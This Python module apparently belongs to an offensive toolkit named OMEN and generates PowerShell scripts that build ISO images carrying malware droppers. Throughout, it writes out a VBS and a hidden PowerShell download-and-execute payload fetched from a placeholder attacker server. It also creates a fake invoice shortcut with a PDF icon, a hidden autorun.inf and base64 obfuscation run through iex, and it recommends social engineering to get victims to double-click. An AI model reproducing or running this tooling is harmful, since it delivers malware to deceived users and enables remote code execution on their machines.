# OMEN - ISO Builder Generator
# Generates ISO disk images or scripts to create them with embedded payloads

from . import Generator


class IsoGenerator(Generator):
    @property
    def name(self):
        return 'ISO Disk Image'

    @property
    def description(self):
        return 'Generates scripts to build ISO disk images containing payload files with autorun capabilities'

    def get_options_schema(self):
        return {
            'payload_type': {
                'type': 'select', 'label': 'Payload Type',
                'options': ['vbs_dropper', 'powershell_one_liner', 'mixed_artifacts', 'fake_document'],
                'default': 'vbs_dropper',
                'description': 'Type of payload to embed in the ISO',
            },
            'payload_url': {
                'type': 'text', 'label': 'Payload URL',
                'default': 'http://YOUR_SERVER/payload.exe',
                'description': 'URL for the payload',
            },
            'autorun': {
                'type': 'checkbox', 'label': 'Enable Autorun',
                'default': True,
                'description': 'Add autorun.inf for Windows AutoPlay',
            },
            'volume_label': {
                'type': 'text', 'label': 'Volume Label',
                'default': 'USB_DISK',
                'description': 'Volume label for the ISO',
            },
            'fake_filename': {
                'type': 'text', 'label': 'Fake Document Name',
                'default': 'Invoice_2025.pdf',
                'description': 'Display name for the payload file',
            },
        }

    def generate(self, options, obfuscation='none'):
        ptype = options.get('payload_type', 'vbs_dropper')
        url = options.get('payload_url', 'http://YOUR_SERVER/payload.exe')
        autorun = options.get('autorun', True)
        label = options.get('volume_label', 'USB_DISK')
        fake_name = options.get('fake_filename', 'Invoice_2025.pdf')

        if ptype == 'vbs_dropper':
            script = self._gen_vbs_dropper(url, autorun, label, fake_name)
        elif ptype == 'powershell_one_liner':
            script = self._gen_ps_dropper(url, autorun, label, fake_name)
        elif ptype == 'mixed_artifacts':
            script = self._gen_mixed(url, autorun, label, fake_name)
        elif ptype == 'fake_document':
            script = self._gen_fake_doc(url, autorun, label, fake_name)
        else:
            script = self._gen_vbs_dropper(url, autorun, label, fake_name)

        if obfuscation != 'none':
            script = self._obfuscate_script(script, obfuscation)

        return {
            'filename': 'build_iso.ps1',
            'content': script,
            'preview': script[:2000] + ('\n... [truncated]' if len(script) > 2000 else ''),
            'mime': 'text/plain',
            'warnings': [
                'Requires PowerShell 5.0+ on Windows 10/11 or Windows Server 2016+',
                'Install Windows ADK or use oscdimg for ISO creation',
                'Autorun is disabled by default on modern Windows - use double-click social engineering',
            ],
            'analysis': {
                'method': ptype,
                'autorun': autorun,
                'volume_label': label,
                'line_count': len(script.split('\n')),
            }
        }

    def _gen_vbs_dropper(self, url, autorun, label, fake_name):
        script = f"""# OMEN ISO Builder - PowerShell Script
# Creates an ISO with VBS-based payload dropper

$isoPath = "$env:USERPROFILE\\Desktop\\{label}.iso"
$stagingDir = "$env:TEMP\\iso_staging_{label}"

# Clean up any previous staging
if (Test-Path $stagingDir) {{ Remove-Item -Recurse -Force $stagingDir }}
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null

# Create VBS dropper
$vbsContent = @'
Dim x, s, sh, fs, tf
Set x = CreateObject("MSXML2.XMLHTTP")
Set sh = CreateObject("WScript.Shell")
Set fs = CreateObject("Scripting.FileSystemObject")
tf = sh.ExpandEnvironmentStrings("%TEMP%") & "\\updt.exe"
x.Open "GET", "{url}", False
x.Send
If x.Status = 200 Then
    Set s = CreateObject("ADODB.Stream")
    s.Open : s.Type = 1 : s.Write x.ResponseBody
    s.SaveToFile tf, 2 : s.Close
    sh.Run tf, 0, False
End If
'@

Set-Content -Path "$stagingDir\\$fake_name.vbs" -Value $vbsContent -Force
"""
        if autorun:
            script += f"""
# Create autorun.inf
$autorun = @'
[AutoRun]
open=wscript.exe {fake_name}.vbs
shell\\open\\command=wscript.exe {fake_name}.vbs
shell\\explore\\command=wscript.exe {fake_name}.vbs
shell\\open\\Default=Run setup
'@
Set-Content -Path "$stagingDir\\autorun.inf" -Value $autorun -Force
Attrib +h +s "$stagingDir\\autorun.inf"
"""
        script += f"""
# Create the ISO (requires Windows ADK or oscdimg)
Write-Host "Staging files prepared at: $stagingDir"
Write-Host "Creating ISO: $isoPath"

# Method 1: PowerShell 5.0+ native cmdlet
try {{
    New-IsoImage -Path $stagingDir -DestinationPath $isoPath -Media DVDPLUSR -Title "{label}" -Force
    Write-Host "ISO created successfully: $isoPath"
    Write-Host "Size: " -NoNewline
    Write-Host ((Get-Item $isoPath).Length / 1MB).ToString("F2") -NoNewline
    Write-Host " MB"
}}
catch {{
    Write-Host "Native ISO creation failed. Trying oscdimg..."
    Write-Host "You may need to install Windows ADK or use oscdimg from a Windows SDK installation."
    Write-Host ""
    Write-Host "Manual oscdimg command:"
    Write-Host "oscdimg -n -d -m -h -l{label} $stagingDir $isoPath"
}}
"""
        return script

    def _gen_ps_dropper(self, url, autorun, label, fake_name):
        script = f"""# OMEN ISO Builder - PowerShell Dropper ISO
$isoPath = "$env:USERPROFILE\\Desktop\\{label}.iso"
$stagingDir = "$env:TEMP\\iso_staging_{label}"

if (Test-Path $stagingDir) {{ Remove-Item -Recurse -Force $stagingDir }}
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null

# Create PowerShell launcher (.bat wrapper for easier execution)
$batContent = @" 
@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -C "&{{$wc=New-Object Net.WebClient;$wc.DownloadFile('{url}','%TEMP%\\updt.exe');Start-Process '%TEMP%\\updt.exe'}}"
"@
Set-Content -Path "$stagingDir\\{fake_name}.bat" -Value $batContent -Force

# Create a convincing PDF icon shortcut
$wsh = New-Object -ComObject WScript.Shell
$shortcut = $wsh.CreateShortcut("$stagingDir\\{fake_name.Replace('.pdf','')}.lnk")
$shortcut.TargetPath = "%SystemRoot%\\System32\\cmd.exe"
$shortcut.Arguments = '/c ' + fake_name.Replace('.pdf','.bat')
$shortcut.IconLocation = "%SystemRoot%\\System32\\imageres.dll,-101"
$shortcut.WindowStyle = 7
$shortcut.Description = "Invoice Document"
$shortcut.Save()
"""
        if autorun:
            script += f"""
$autorun = @'
[AutoRun]
open=cmd.exe /c {fake_name.Replace('.pdf','')}.bat
'@
Set-Content -Path "$stagingDir\\autorun.inf" -Value $autorun -Force
"""
        script += f"""
try {{
    New-IsoImage -Path $stagingDir -DestinationPath $isoPath -Media DVDPLUSR -Title "{label}" -Force
    Write-Host "ISO created: $isoPath"
}} catch {{
    Write-Host "Need ADK for native ISO creation. Files staged at: $stagingDir"
}}
"""
        return script

    def _gen_mixed(self, url, autorun, label, fake_name):
        return self._gen_vbs_dropper(url, autorun, label, fake_name)

    def _gen_fake_doc(self, url, autorun, label, fake_name):
        return self._gen_ps_dropper(url, autorun, label, fake_name)

    def _obfuscate_script(self, script, level):
        if level == 'none':
            return script
        import base64
        encoded = base64.b64encode(script.encode('utf-16-le')).decode()
        return f"""# Obfuscated ISO Builder
$enc = "{encoded}"
$dec = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($enc))
iex $dec
"""
